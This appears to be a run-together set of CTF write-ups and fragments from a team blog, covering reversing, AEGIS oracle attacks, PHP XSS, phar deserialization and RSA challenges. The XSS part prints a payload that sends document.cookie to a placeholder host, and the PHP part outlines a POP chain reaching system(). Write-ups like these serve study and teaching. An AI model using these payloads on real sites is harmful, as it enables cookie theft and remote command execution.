$n = 4$, otherwise our OCD would be forcing us to find $g(4)$ and the writeup will be flooded by a large forest.\nPart IV: Algorithms, algorithms everywhere In this part, harrier and I work on a different topic:\n harrier's task: Find $g(1337)$. Mystiz's task: Find the flag if harrier has $g(1337)$ computed.  4.1. What is $g(1337)$? To find the number of good trees of height $h$, we define an auxiliary variable $k$ (interpret it as cooldown). Here we redefine good trees again:\nFor a ternary tree, it is said to be good if for every node,\n [Recovery] if $k \u0026gt; 0$: there should be at most one child, and [Fertility] if $k = 0$: if there are $c$ children, then each of them has cooldown $k = c-1$.  Simply put, you need to recover to be fertile. For instance, the following is a good tree since each of the node with non-zero cooldown has only a child.\ndigraph { node[shape=rectangle, style=rounded] t0 [label=0] t1 [label=1] t2 [label=1] t3 [label=0] t4 [label=0] t0-\u0026gt;t1 t0-\u0026gt;t2 t1-\u0026gt;t3 t2-\u0026gt;t4 } However, this is not a good tree since the red node is too fertile:\ndigraph { node[shape=rectangle, style=rounded] t0 [label=0] t1 [label=1, style=\u0026#34;filled, rounded\u0026#34;, fillcolor=\u0026#34;#ff000080\u0026#34;] t2 [label=1] t3 [label=0] t4 [label=0] t5 [label=0] t0-\u0026gt;t1 t0-\u0026gt;t2 t1-\u0026gt;t3 t1-\u0026gt;t4 t2-\u0026gt;t5 } Luckily, we don't need to count the good trees one by one. It can be solved by dynamic programming rather easily. Let's define the state dp[h][k] to be the number of good trees if the tree is of depth h and cooldown k. Then:\n [Base case] dp[0][k] == 1 for every k, [Transition] dp[h][k] == dp[h-1][k-1] for h, k \u0026gt; 0, and [Transition] dp[h][0] == dp[h-1][0] + dp[h-1][1]**2 + dp[h-1][2]**3 for h \u0026gt; 0.  The first condition is obvious - the only tree with depth 0 is the tree with the only root node. It is good no matter what the cooldown is.\nFor the second condition, it is not difficult to imagine it as an tree that must cooldown. Hence, if $\\text{GT}_{hk}$ is a good tree with height $h\u0026gt;0$ and cooldown $k\u0026gt;0$, then:\ndigraph { node[shape=point] edge[arrowhead=false] x-\u0026gt;st subgraph cluster { style=filled color=lightgray label=\u0026#34;GTₕ₋₁,ₖ₋₁\u0026#34; labelloc=b st[shape=triangle, height=2, label=\u0026#34;\u0026#34;] } } It is a little bit tricky for the third condition. Since it is in the fertile mode again, we can decide if there are one, two or three children. Then each of the following trees work:\ndigraph { node[shape=point] edge[arrowhead=false] x0-\u0026gt;st0 subgraph cluster0 { style=filled color=lightgray label=\u0026#34;GTₕ₋₁,₀\u0026#34; labelloc=b st0[shape=triangle, height=2, label=\u0026#34;\u0026#34;] } x1-\u0026gt;st1:n x1-\u0026gt;st2:n subgraph cluster1 { style=filled color=lightgray label=\u0026#34;Each subtree is GTₕ₋₁,₁\u0026#34; labelloc=b st1[shape=triangle, height=2, label=\u0026#34;\u0026#34;] st2[shape=triangle, height=2, label=\u0026#34;\u0026#34;] } x2-\u0026gt;st3:n x2-\u0026gt;st4:n x2-\u0026gt;st5:n subgraph cluster2 { style=filled color=lightgray label=\u0026#34;Each subtree is GTₕ₋₁,₂\u0026#34; labelloc=b st3[shape=triangle, height=2, label=\u0026#34;\u0026#34;] st4[shape=triangle, height=2, label=\u0026#34;\u0026#34;] st5[shape=triangle, height=2, label=\u0026#34;\u0026#34;] } } Hence, if there are k children, then there are dp[h-1][k-1]**k choices. Since we are able to pick k = 1, 2, 3, we can simply sum them up for dp[h][k]. After all, this is the Python script to compute:\ndef g(k: int) -\u0026gt; int: # Base case dp = [[1, 1, 1]] # Transition for _ in range(k): dp.append([ sum([dp[-1][i]**(i+1) for i in range(3)]), dp[-1][0], dp[-1][1] ]) return dp[-1][0] But the numbers is growing exponentially and finding $g(1337)$ takes eternally. What can we do? Nevermind, we will get back to this shortly.\n4.2. Fast sequence generation To compute the values of ecx and edx, we can find the number of executed instructions (denote it as $q$). Since the loop is completed every four steps, we can find $s_{\\mathbf{floor}(q/4)}$ and $s_{\\mathbf{floor}(q/4)+1}$ and perform the remainder of the instructions.\nLet's get back to the sequence $s_n$:\n $s_0 = \\text{82F96AC97429A68B}_{16}$, $s_1 = \\text{32B9B6BCA55548ED}_{16}$, and $s_k = 3 s_{k-2} + 2 s_{k-1} + 4\\mod2^{64}$ for $k \\geq 2$.  To compute it efficiently, we can rewrite it as a matrix notation:\n\\[ \\begin{bmatrix} s_{k+1} \\\\ s_k \\\\ 1 \\end{bmatrix} = \\begin{bmatrix} 2 \u0026 3 \u0026 4 \\\\ 1 \u0026 0 \u0026 0 \\\\ 0 \u0026 0 \u0026 1\\end{bmatrix} \\begin{bmatrix} s_k \\\\ s_{k-1} \\\\ 1 \\end{bmatrix} \\mod 2^{64}. \\]\nWhy? Try the multiplication by yourselves! Anyway, then we are able to compute $s_m$ and $s_{m+1}$ efficiently, since\n\\[ \\begin{bmatrix} s_{m+1} \\\\ s_m \\\\ 1 \\end{bmatrix} = \\begin{bmatrix} 2 \u0026 3 \u0026 4 \\\\ 1 \u0026 0 \u0026 0 \\\\ 0 \u0026 0 \u0026 1\\end{bmatrix}^m \\begin{bmatrix} s_1 \\\\ s_0 \\\\ 1 \\end{bmatrix} \\mod 2^{64}. \\]\nMoreover, since\n\\[\\begin{bmatrix} 2 \u0026 3 \u0026 4 \\\\ 1 \u0026 0 \u0026 0 \\\\ 0 \u0026 0 \u0026 1\\end{bmatrix}^{2^{64}} = \\begin{bmatrix} 1 \u0026 0 \u0026 0 \\\\ 0 \u0026 1 \u0026 0 \\\\ 0 \u0026 0 \u0026 1\\end{bmatrix}, \\]\nthe square matrix has order $2^{64}$. That said, we don't need to find the exact value for $g(1337)$. Instead, we can compute $g(1337)\\mod (2^{64}\\times4)$. Hereby we need to multiple the number by four, since there are 4 instructions per loop).\nPart V: The flagggggggggg! After all, we can modify the Python function we had to compute $g(k)\\mod 2^{66}$:\ndef g(k: int) -\u0026gt; int: # Base case dp = [[1, 1, 1]] # Transition for _ in range(k): dp.append([ sum([dp[-1][i]**(i+1) for i in range(3)]) % 2**66, dp[-1][0], dp[-1][1] ]) return dp[-1][0] And g(1337) = 59988074356265869957 pops out at no time. Therefore, we can find $s_{14997018589066467489}$ and $s_{14997018589066467490}$ and proceed one instruction further. We have rdx being 0x62246322232ceabf and rcx being 0xbf1d9826c054007!\nThus p4{62246322232ceabfbf1d9826c054007} would be the flag, right? NO!\nIt was 4:40 am and we were very sleepy. It took us few minutes to figure out that rcx isn't composed of 16 hexchars. The correct flag should be p4{62246322232ceabf0bf1d9826c054007} (note that there is an zero). Yeah, :checkered_flag: - and we are the first to capture this!\n","permalink":"https://b6a.black/posts/2020-09-08-confidencectf-team-trees/","summary":"This week, we have teamed up as @blackb6a to play CONFidence 2020 CTF.

This writeup is written by @harrier_lcc and @mystiz613.\nChallenge Summary  We wanted to plant a lot of trees, but it's going kinda slow.","title":"CONFidence 2020 CTF: Team Trees"},{"content":"I was teamed-up with @blackb6a on Google CTF this time. I have solved 7 challenges alone and 3 challenges with my teammates.\nIn particular, Oracle is a crypto challenge with 13 solves. It has got me spending 12 hours. All in all, it was a great experience in terms of learning, but my liver hurts. This piece of writeup may be very computation intensive, just because I would like to make everything clear.\nChallenge Summary There are two parts of the challenges. In the first part, we are required to recover an internal state for AEGIS-128L given the encryption oracle. For the second part, we are required to forge a ciphertext given an error oracle from decryption.\nSolution Part I: A brief summary for the state in AEGIS-128L AEGIS-128L has an internal state that is initially computed solely by the key and the IV. It is of 128 bytes, broken into eight 16-byte blocks. Let's $S_i$ is updated to $S_{i+1}$ given 32-byte payload $M$. Let's define $S_i = (s_{i, 0}, s_{i, 1}, ..., s_{i, 7})$ and $M = (m_0, m_1)$. We have:\n $s_{i+1, 0} \\leftarrow \\text{AESEnc}(s_{i, 7}, s_{i, 0}) \\oplus m_0$, $s_{i+1, 4} \\leftarrow \\text{AESEnc}(s_{i, 3}, s_{i, 4}) \\oplus m_1$, and $s_{i+1, j} \\leftarrow \\text{AESEnc}(s_{i, j-1}, s_{i, j})$ for $j = 1, 2, 3, 5, 6, 7$.  But what is AESEnc? Let's see the implementation.\ndef aes_enc(s: block, t: block) -\u0026gt; block: \u0026#34;\u0026#34;\u0026#34;Performs the AESENC operation with tables.\u0026#34;\u0026#34;\u0026#34; t0 = (te0[s[0]] ^ te1[s[5]] ^ te2[s[10]] ^ te3[s[15]]) t1 = (te0[s[4]] ^ te1[s[9]] ^ te2[s[14]] ^ te3[s[3]]) t2 = (te0[s[8]] ^ te1[s[13]] ^ te2[s[2]] ^ te3[s[7]]) t3 = (te0[s[12]] ^ te1[s[1]] ^ te2[s[6]] ^ te3[s[11]]) s = _block_from_ints([t0, t1, t2, t3]) return _xor(s, t) Well... we will go through this later. Let's introduce how keystreams are generated from the state. It is (relatively) simple. The keystream $(k_{i, 0}, k_{i, 1})$ for the $i$-th round is given by:\n\\[ k_{i, 0} = (s_{i, 2} \\wedge s_{i, 3}) \\oplus s_{i, 1} \\oplus s_{i, 6}, \\\\ k_{i, 1} = (s_{i, 6} \\wedge s_{i, 7}) \\oplus s_{i, 5} \\oplus s_{i, 2}. \\]\nPart II: Recovering part of the state Now we are given that key and IV are unchanged. This implies that the initial state, i.e., $s_{00}, s_{01}, ..., s_{09}$ are constants too.\nSuppose that we have two 96-byte messages $M^{(1)}$ and $M^{(2)}$ with only the first two blocks are different (Formally, if $M^{(k)} := (m^{(k)}_{00}, m^{(k)}_{01}, ..., m^{(k)}_{21}$), then $m^{(1)}_{ij} = m^{(2)}_{ij}$ if and only if $i \\neq 0$).\nThe following table summarizes which of the $s_{ij}$'s that would be different (marked by an !), when encrypting $M^{(1)}$ and $M^{(2)}$ respectively.\n   $i$ \\ $j$ 0 1 2 3 4 5 6 7     0           1 !    !      2 ! !   ! !      What does this imply? Knowing that $s^{(1)}_{2,j} = s^{(2)}_{2,j}$ for $j = 2, 3, 6, 7$. Let's look closely on the last 32 bytes of the keystream:\n\\[ \\begin{aligned} k^{(1)}_{20} \\oplus k^{(2)}_{20} \u0026= m^{(1)}_{20} \\oplus c^{(1)}_{20} \\oplus m^{(2)}_{20} \\oplus c^{(2)}_{20} \\\\ \u0026= \\left[ (s^{(1)}_{22} \\wedge s^{(1)}_{23}) \\oplus s^{(1)}_{21} \\oplus s^{(1)}_{26} \\right] \\oplus \\left[ (s^{(2)}_{22} \\wedge s^{(2)}_{23}) \\oplus s^{(2)}_{21} \\oplus s^{(2)}_{26} \\right] \\\\ \u0026= s^{(1)}_{21} \\oplus s^{(2)}_{21}. \\end{aligned} \\]\nAnd similarly $k^{(1)}_{21} \\oplus k^{(2)}_{21} = s^{(1)}_{25} \\oplus s^{(2)}_{25}$.\nWhy is it useful? Let's define a new function, p:\ndef p(s: block) -\u0026gt; block: t0 = (te0[s[0]] ^ te1[s[5]] ^ te2[s[10]] ^ te3[s[15]]) t1 = (te0[s[4]] ^ te1[s[9]] ^ te2[s[14]] ^ te3[s[3]]) t2 = (te0[s[8]] ^ te1[s[13]] ^ te2[s[2]] ^ te3[s[7]]) t3 = (te0[s[12]] ^ te1[s[1]] ^ te2[s[6]] ^ te3[s[11]]) return _block_from_ints([t0, t1, t2, t3]) Déjà vu? It is more or less the same with AESEnc. We can state that AESEnc(s, t) == p(s) ^ t too. Looking even more closely, one could observe that the first four bytes from p solely depends on bytes 0, 5, 10 and 15 from s.\nKnowing this, we can further expand $k^{(1)}_{20} \\oplus k^{(2)}_{20}$:\n\\[\\begin{aligned} k^{(1)}_{20} \\oplus k^{(2)}_{20} \u0026= s^{(1)}_{21} \\oplus s^{(2)}_{21} \\\\ \u0026= \\text{AESEnc}(s^{(1)}_{10}, s^{(1)}_{11}) \\oplus \\text{AESEnc}(s^{(2)}_{10}, s^{(2)}_{11}) \\\\ \u0026= p(s^{(1)}_{10}) \\oplus s^{(1)}_{11} \\oplus p(s^{(2)}_{10}) \\oplus s^{(2)}_{11} \\\\ \u0026= p(s^{(1)}_{10}) \\oplus p(s^{(2)}_{10}) \\\\ \u0026= p\\left(\\text{AESEnc}(s^{(1)}_{07}, s^{(1)}_{00}) \\oplus m^{(1)}_{00}\\right) \\oplus p\\left(\\text{AESEnc}(s^{(2)}_{07}, s^{(2)}_{00}) \\oplus m^{(2)}_{00}\\right) \\\\ \u0026= p(x \\oplus m^{(1)}_{00}) \\oplus p(x \\oplus m^{(2)}_{00}). \\end{aligned}\\]\n(We define $x := \\text{AESEnc}(s_{07}, s_{00}) = s_{10} \\oplus m^{(1)}_{00}$ for ease of reading.)\nAnd now the only unknown is $x$. Can we solve it easily? Yes indeed: we can compute bytes 0, 5, 10, 15 of $x$ from the first four bytes of $k^{(1)}_{20} \\oplus k^{(2)}_{20}$. Along with three more equalities from p, we are able to recover $x$ completely. I used an meet-in-the-middle approach to solve for $x$ in five seconds.\n But wait. There is a problem: I am able to find 65536 candidates (or even more) instead of 1, but I am unable to eliminate the rest. The possible number of states will be growing exponentally! What can I do? The solution is actually simple: Just send $M^{(3)}$ and compute another solution set of $x$. After all, it is very likely that $x$ is the only element in the intersection of the two sets. With $x$, we are able to compute $s_{10}$ (respectively $s_{14}$).\nPart III: Finishing the first part of the challenge We can extend the above idea to leak more. By sending two 128-byte messages with blocks 3 and 4 being different, we are able to recover $s_{20}$ and $s_{24}$. We are able to leak $s_{30}$ and $s_{34}$ with the same idea.\nTwo more questions remain: How is it made possible in seven queries? And more importantly, how can we recover $s_{ij}$ for all $j$, for some $i$ (preferably $i = 0\\ \\text{or}\\ 1$)?\nChallenge 1. Recover the above states in 7 queries.\nIn short, we are encrypting these seven plaintexts (each 0 represents 16 \\x00's, etc):\n 0000000000 0000110000 0000220000 - Derive $s_{10}$ and $s_{14}$ uniquely with (1) and (2) 0000001100 0000002200 - Derive $s_{20}$ and $s_{24}$ uniquely with (1) and (4) 0000000011 0000000022 - Derive $s_{30}$ and $s_{34}$ uniquely with (1) and (6)  Challenge 2. Recover $s_{1, j}$ for all $j$.\nFrom above, we are able to derive $s_{i, 0}$ and $s_{i, 4}$ for $i = 1, 2, 3$ with $m_{ij} = 0$. Hence, the state transition would be $s_{i+1, j} \\leftarrow p(s_{i, j-1}) \\oplus s_{ij}$ for all $i, j$. Equivalently $s_{i, j-1} = p^{-1}(s_{i+1, j} \\oplus s_{ij})$.\nWe are able to compute inverses of $p^{-1}$ easily. Solving system of linear equations would be all good, but I'm doing it with meet-in-the-middle. Code reuse for the win! For now, let's visualize how $s_{1, j}$'s can be derived.\ndigraph { rankdir=BT s₁₀[fillcolor=yellow,style=filled] s₁₄[fillcolor=yellow,style=filled] s₂₀[fillcolor=yellow,style=filled] s₂₄[fillcolor=yellow,style=filled] s₃₀[fillcolor=yellow,style=filled] s₃₄[fillcolor=yellow,style=filled] s₂₀ -\u0026gt; s₂₇ s₃₀ -\u0026gt; s₂₇ s₂₄ -\u0026gt; s₂₃ s₃₄ -\u0026gt; s₂₃ s₁₄ -\u0026gt; s₁₃ s₂₄ -\u0026gt; s₁₃ s₁₃ -\u0026gt; s₁₂ s₂₃ -\u0026gt; s₁₂ s₁₀ -\u0026gt; s₁₇ s₂₀ -\u0026gt; s₁₇ s₁₇ -\u0026gt; s₁₆ s₂₇ -\u0026gt; s₁₆ s₁₂ -\u0026gt; s₁₁ s₁₃ -\u0026gt; s₁₁ s₁₆ -\u0026gt; s₁₁ s₁₆ -\u0026gt; s₁₅ s₁₇ -\u0026gt; s₁₅ s₁₂ -\u0026gt; s₁₅ } After all, the first part of the challenge is done.\nPart IV: AEGIS-128 vs AEGIS-128L For the second part, AEGIS-128 is used. The state is now 80 bytes (five 16-byte blocks). The payload size has been reduced to one block (let's denote it by $m$). This is how the state transited:\n $s_{i+1, 0} \\leftarrow p(s_{i, 4}) \\oplus s_{i, 0} \\oplus m$, and $s_{i+1, j} \\leftarrow p(s_{i, j-1}) \\oplus s_{i, j}$ for $1 \\leq j \\leq 4$.  Moreover, the keystream $k_i$ for the $i$-th round is also altered: $k_i = (s_{i, 2} \\wedge s_{i, 3}) \\oplus s_{i, 1} \\oplus s_{i, 4}$.\nPart V: Exploring the challenge I have no idea what's going on, so I decided to recover the printable secret_plaintext first.\nIt is pretty easy, and is made possible because we are able to receive the error from the oracle. In particular, from pt.decode(\u0026quot;ascii\u0026quot;).\nWe are able to recover the plaintext with bit-flipping. To begin with, we can flip the whole ciphertext by \\x80. The first 32 bytes for the plaintext would be flipped by \\x80 as well. If we send the flipped ciphertext (denote by $c_?$) to the oracle, we will obtain:\nUnicodeDecodeError: \u0026#39;ascii\u0026#39; codec can\u0026#39;t decode byte 0xe7 in position 0: ordinal not in range(128) This means that the first byte of the flipped plaintext would be \\xe7. Hence, the first byte of the plaintext is \\x67 (g). We then flip the first byte of $c_?$ by \\x80 and send it to the oracle, we will be receiving another error:\nUnicodeDecodeError: \u0026#39;ascii\u0026#39; codec can\u0026#39;t decode byte 0xc6 in position 1: ordinal not in range(128) This recovers the second byte - x46 (F). Since the secret plaintext is 96-byte long, we can recover it with 96 oracle calls.\nREMAINING ORACLE CALLS: 231 - 96 = 135.\nWith a plaintext recovered, it is time for us to try to recover the internal state. Can we devise a similar strategy that is similar to the first part of the challenge? Formally, what will happen if we have two 48-byte messages $M^{(1)} := (m^{(1)}_0, m^{(1)}_1, m^{(1)}_2)$ and $M^{(2)} := (m^{(2)}_0, m^{(2)}_1, m^{(2)}_2)$ with only the first block being different. Then the last 16 bytes in the keystream will be:\n\\[ \\begin{aligned} k^{(1)}_2 \\oplus k^{(2)}_2 \u0026= \\left[ (s^{(1)}_{22} \\wedge s^{(1)}_{23}) \\oplus s^{(1)}_{21} \\oplus s^{(1)}_{24} \\right] \\oplus \\left[ (s^{(2)}_{22} \\wedge s^{(2)}_{23}) \\oplus s^{(2)}_{21} \\oplus s^{(2)}_{24} \\right] \\\\ \u0026= s^{(1)}_{21} \\oplus s^{(2)}_{21} \\\\ \u0026= p(s^{(1)}_{10}) \\oplus s^{(1)}_{11} \\oplus p(s^{(2)}_{10}) \\oplus s^{(2)}_{11} \\\\ \u0026= p(s^{(1)}_{10}) \\oplus p(s^{(2)}_{10}) \\\\ \u0026= p\\left(\\text{AESEnc}(s^{(1)}_{04}, s^{(1)}_{00}) \\oplus m^{(1)}_1\\right) \\oplus p\\left(\\text{AESEnc}(s^{(2)}_{04}, s^{(2)}_{00}) \\oplus m^{(2)}_1\\right) \\\\ \u0026= p(x \\oplus m^{(1)}_0) \\oplus p(x \\oplus m^{(2)}_0). \\end{aligned} \\]\nHereby denote $x := \\text{AESEnc}(s_{04}, s_{00}) = s_{10} \\oplus m^{(1)}_0$. Simply put, if we have the ciphertexts for $M^{(1)}$ and $M^{(2)}$ (denote it as $C^{(k)} = (c^{(k)}_0, c^{(k)}_1, c^{(k)}_2)$), we are able to recover one-fifths of the state if this happens.\nHow are we able to do it? Well actually, we have recovered the secret plaintext above. We can flip the first block of the ciphertext arbitrarily (to $C_?$).\nHowever, since $k^{(2)}_2$ is altered, the third block of the message would be updated. Luckily we are able to recover the message in 17 oracle calls. Here's how:\n Sends $C_?$. We will obtain something like this: UnicodeDecodeError: 'ascii' codec can't decode byte 0xe8 in position 34... Flips the 35th byte by \\xe8 in $C_?$. Sends the patched $C_?$: UnicodeDecodeError: 'ascii' codec can't decode byte 0xcb in position 35... Flips the 36th byte by \\xcb in $C_?$. Repeat the process until we receive OK, meaning that the plaintext is now ASCII-encoded. For now, we have recovered a subset of message bytes. We then flip the unknown bytes by \\x80 (for example, bytes 33 and 34) to throw errors from the oracle. Repeat step 1 until all unknown bytes are recovered.  In short, we spent 16 oracle calls to recover the message, and one oracle call to indicate us to flip all the bytes those were originally printable. We are then able to recover a possible set of $s_{10}$ with 65536 entries (or more). We can spend another 17 queries to find the actual $s_{10}$, however.\nREMAINING ORACLE CALLS: 135 - 17\u0026times;2 = 101.\nWith the same idea, we can recover $s_{20}, s_{30}, s_{40}$ with 17\u0026times;6 queries. This would allow us to recover $s_{10}, s_{11}, ..., s_{14}$ and hence forging arbitrary messages (along with a slightly longer AD).\nREMAINING ORACLE CALLS: 101 - 17\u0026times;6 = -1.\nShoot - we are one query short. Since we are able to recover one byte of the plaintext in each of the queries, so it doesn't hurt to sacrifice one oracle calls by guessing one byte. So... in theory, we are able to finish the challenge with once every 256 times.\nLuckily, if we are given a incorrect plaintext (actually keystream), we are unable to recover a single $s_*$. That's pretty good, we are able to solve the challenge every time.\nREMAINING ORACLE CALLS: -1 + 1 = :tada:.\nWith the exploit script written, I am able to reach the very end locally. Congratulations to me!\nPart IV: Wait... Aren't we done? No... When I am interacting to the server, I am always disconnected while sending one of the 231 oracle calls. Asking the organizers in IRC, knowing that there was an 1-minute timeout - it was later increased to 10 minutes. Unfortunately, my solution runs for around 5 minutes. I have two choices:\n Wait until the challenge has a 10-minute timeout, or Optimize the script and have it completed in one minute.  Seeing that there are already few teams solving the challenge, I think (2) would be fun.\n6.1. Reducing online complexity For inputs that does not require immediate feedbacks, we can send them at the same time. This is an example when I am recovering secret_plaintext in the second part.\n# Before optimization test_ciphertext = bytes([c^0x80 for c in ciphertext]) m0 = b\u0026#39;\u0026#39; for i in range(96): r.sendline(base64.b64encode(test_ciphertext)) test_ciphertext = cxor(test_ciphertext, i, 0x80) p, mc = try_decrypt_read(r) assert p == i m0 += bytes([mc^0x80]) # After optimization test_ciphertext = bytes([c^0x80 for c in ciphertext]) m0 = b\u0026#39;\u0026#39; for i in range(96): r.sendline(base64.b64encode(test_ciphertext)) test_ciphertext = cxor(test_ciphertext, i, 0x80) for i in range(96): p, mc = try_decrypt_read(r) assert p == i m0 += bytes([mc^0x80]) 6.2. Reducing offline complexity For example, this is the method I implemented to solve for $x$ from $p(x \\oplus a) \\oplus p(x \\oplus b) = c$ - it takes one second each time:\ndef px_subsolve(a_sub, b_sub, c_sub): # Given a_sub, b_sub, c_sub (4 bytes), find x_sub such that # te0[(x_sub ^ a_sub)[0]] ^ te1[(x_sub ^ a_sub)[1]] ^ te2[(x_sub ^ a_sub)[2]] ^ te3[(x_sub ^ a_sub)[3]] # ^ te0[(x_sub ^ a_sub)[0]] ^ te1[(x_sub ^ a_sub)[1]] ^ te2[(x_sub ^ a_sub)[2]] ^ te3[(x_sub ^ a_sub)[3]] # = c_sub # Reformulating: # te0[(x_sub ^ a_sub)[0]] ^ te1[(x_sub ^ a_sub)[1]] ^ te0[(x_sub ^ a_sub)[0]] ^ te1[(x_sub ^ a_sub)[1]] ^ c_sub # = te2[(x_sub ^ a_sub)[2]] ^ te3[(x_sub ^ a_sub)[3]] ^ te2[(x_sub ^ a_sub)[2]] ^ te3[(x_sub ^ a_sub)[3]] lhss = {} for x0, x1 in itertools.product(range(256), repeat=2): # LHS xs = [be0[x0^a_sub[0]], be0[x0^b_sub[0]], be1[x1^a_sub[1]], be1[x1^b_sub[1]], c_sub] y = reduce(_xor, xs) lhss[y] = lhss.get(y, []) + [(x0, x1)] solns = [] for x2, x3 in itertools.product(range(256), repeat=2): # RHS xs = [be2[x2^a_sub[2]], be2[x2^b_sub[2]], be3[x3^a_sub[3]], be3[x3^b_sub[3]]] y = reduce(_xor, xs) for x0, x1 in lhss.get(y, []): solns.append(bytes([x0, x1, x2, x3])) return solns However, if we force a_sub == b'\\0'*4 and b_sub == b'\\1'*4 or b_sub == b'\\2'*4, the right hand side can be precomputed. We are able to solve for $x$ once every 0.2 second.\nAt last - we are able to get the flag in 30 seconds locally and around 55 seconds online! :tada:\n Credits  Thanks @harrier_lcc who noticed that my lever did not hurt. Playing Minecraft too much, I misspelt liver. Thanks @hellman1908 for pointing that we are able to bruteforce byte by byte instead of bruteforcing columns, since that we can apply MixColumns inverse.

After setting $_GET['login'], you can enter something in $_GET['new'], which is supposed to be reflected on the page for XSS.\nThanks to ob_start(); and ob_end_clean();, nothing about the user input are printed in the normal case.\nTo address this, we can make the interpreter panic before ob_end_clean();. Maybe unserialize could do so?\nBut most of the time unserialize just returns FALSE when you input some garbage that is \u0026quot;un-unserialize-able\u0026quot; (pun intended)\nLet's try to unserialize some meaningful junks:\n\u0026lt;?php foreach (get_declared_classes() as $c) { unserialize(\u0026#39;O:\u0026#39;.strlen($c).\u0026#39;:\u0026#34;\u0026#39;.$c.\u0026#39;\u0026#34;:0:{}\u0026#39;); } It shows Fatal error: Uncaught Error: Invalid serialization data for DateTime object. So DateTime should do the trick.\nHow about the actual XSS payload? We can't use \u0026lt;script src=//blah\u0026gt;\u0026lt;/script\u0026gt;.\nFor some reason script\u0026lt;script src=//blah\u0026gt;\u0026lt;/script\u0026gt; could bypass that stripos but it is too long.\nLater on I found that /req.php accepts external URLs as well. So we can use some other tricks like window.name:\n\u0026lt;script\u0026gt;name=\u0026#39;location=\u0026#34;//blah/\u0026#34;+document.cookie\u0026#39;;location=\u0026#39;//127.0.0.1/?new=%3Cbody%20onload=eval(name)%3E\u0026amp;login=O:8:%22DateTime%22:0:%7B%7D\u0026#39;;\u0026lt;/script\u0026gt; Remarks At first I tried the payload with iframe but Chrome blocks the Set-Cookie header due to \u0026quot;third-party cookies preference\u0026quot;.\nThen I tried the payload with form and Chrome blocks the popup as expected.

It immediately links to phar unserialize\n 有個 upload.php 真係可以 upload 野. 不過會 check getimagesize 同 image/jpeg\n There is an upload.php that can really upload things. But it checks with getimagesize and image/jpeg.\n 睇返個 old.php, 又係驗眼嘅時間. 最底有個 $data = \u0026quot;\u0026lt;?php\\n//\u0026quot; . sprintf('%012d', $expire) . \u0026quot;\\n exit();?\u0026gt;\\n\u0026quot; . $data; 但係無咩用.\n Let's go back to old.php and check our eyesight. The bottom $data = \u0026quot;\u0026lt;?php... looks interesting but unless.\n 除非個 sprintf('%012d', $expire) 可以整走個 exit() 啦.\n Unless sprintf('%012d', $expire) could be used to get rid of that exit().\n 再碌上 D 見到個詭異嘅 variable function return $serialize($data);. 咁開心.\n Scroll up a bit then we can see a weird variable function return $serialize($data);. So exciting.\n 所以如果將 $this-\u0026gt;options['serialize'] 改做 system 就可以行 system.\n So if we set $this-\u0026gt;options['serialize'] to system then we could run system.\n 但係個 $data 要點砌呢. 根據所謂 POP 可以 trace 到:\n But how can we control $data? According to the so-called Property-Oriented Programming, you can trace like this:\n $this-\u0026gt;options['serialize']($data) //cl2-\u0026gt;serialize\n=\u0026gt; $this-\u0026gt;serialize($value) //cl2-\u0026gt;set\n=\u0026gt; $this-\u0026gt;store-\u0026gt;set($this-\u0026gt;key, $this-\u0026gt;getForStorage(), $this-\u0026gt;expire); //cl1-\u0026gt;save\n=\u0026gt; return json_encode([$this-\u0026gt;cleanContents($this-\u0026gt;cache), $this-\u0026gt;complete]); //cl1-\u0026gt;getForStorage()\n首先個 $data 有少少限制. 因為係 json_encode 個 Array.\n First, the $data is a bit restricted. Because it is constructed by json_encode-ing an array.\n 不過你想用 system 行 command 其實可以好求其. 好似咩 $(ls).\n But if you just need to use system to execute command, it is pretty flexible. Like using $(ls).\n 最後可以砌到好似 system('[\u0026quot;$(ls)\u0026quot;,0]').\n At the end of the day we should be able to construct like system('[\u0026quot;$(ls)\u0026quot;,0]').\n 要 trigger cl1-\u0026gt;save, destructor 個 $this-\u0026gt;autosave 要 false.\n If you want to trigger cl1-\u0026gt;save, in the destructor, $this-\u0026gt;autosave should be false.\n 依家有齊啲餡啦. 要搵返 phar 個 payload.\n We are cooking with gas.

However, if we want control __free_hook, we need to try harder.

When you start the game, you are in a dark maze. You can walk but not jump nor run. Nothing will be triggered when you walk out of the maze.\nI think there should be multiple ways to solve the challenge. One solution will be physcially break the maze. How to do that? By deleting the walls object in the level.\nWith Unity Assets Bundle Extractor, we are able to delete walls in /CTF_Data/level0 (which is level of the maze). \nAfter deleting some of the wall objects (for me I selected the GameObject Wall with number greater than 100) and returning to the game, you will find a wall that marks the flag for game 2:\n\nThere are some characters missing in the wall because we deleted some of the characters by accident. We did a bit of guess and finally got the flag: 3K-CTF-A-MAZE-ING.\nThere are also some floating walls inside the maze. When you walk through it you will get a word overlayed on the top left corner. \nDecompiling /CTF_Data/Managed/Assembly-CSharp.dll will get you the logic of the game.  If you find and hit the 6 walls with the right order (I guess it should be the shortest path from the starting point to the flag room), the game will output you a flag. If not, an error message will be displayed. \nHere in UABE we found 6 assets with duplicated names. It should correspond to the 6 floating walls in the game. \nAfter some tries (with a bit of luck), we were able to get the flag for game 1. \nFlag: 3K-CTF-GamingIsNotACrime.\nReference: https://github.com/imadr/Unity-game-hacking\npyzzle (Reverse/Misc/Crypto; 459+479 points) Solved by crabmony and Mystiz.\nPart 1 We are given a concrete syntax tree that is from LibCST.\nWe referred to the documentation and traverse the tree manually.

Theoretically, we should be able to recover the original message with 3 ciphertexts, assuming that those ciphertexts are encrypted with exp = 1.\nWe have written the core logic to retrieve the message, given some ciphertexts:\ndef attempt(subpairs): n = len(subpairs) # (m + pi)^3 = ci (mod ni) cs = list(map(lambda pair: pair[0], subpairs)) ns = list(map(lambda pair: pair[1], subpairs)) ps = list(map(lambda pair: pair[2], subpairs)) nprod = reduce(mul, ns) gs = [[0 for _ in range(n)] for _ in range(3+1)] for i in range(n): for j in range(3+1): gs[j][i] = binomial(3, j) * pow(ps[i], j, nprod) % ns[i] gs[3][i] = ((gs[3][i] - cs[i]) % ns[i] + ns[i]) % ns[i] gg = [int(crt(gs[i], ns)) for i in range(3+1)] # Defines e, Zn = Zmod(nprod) and the parameters for the # Coppersmith\u0026#39;s attack here.

